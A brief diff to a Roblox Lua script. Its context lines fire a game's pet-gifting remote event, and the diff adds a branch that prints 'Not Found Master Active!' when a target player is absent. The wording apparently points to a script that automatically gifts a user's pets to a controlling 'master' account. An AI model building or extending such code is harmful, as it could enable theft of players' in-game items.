@@ -177,6 +177,8 @@ task.spawn(function()
                                             }
                                             game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
                                         end
+                                    elseif toolequip and not game.Players:FindFirstChild(x) then
+                                        print("Not Found Master Active! [2]")
                                     else
                                         print("Trade Success!")
                                         wait(5)
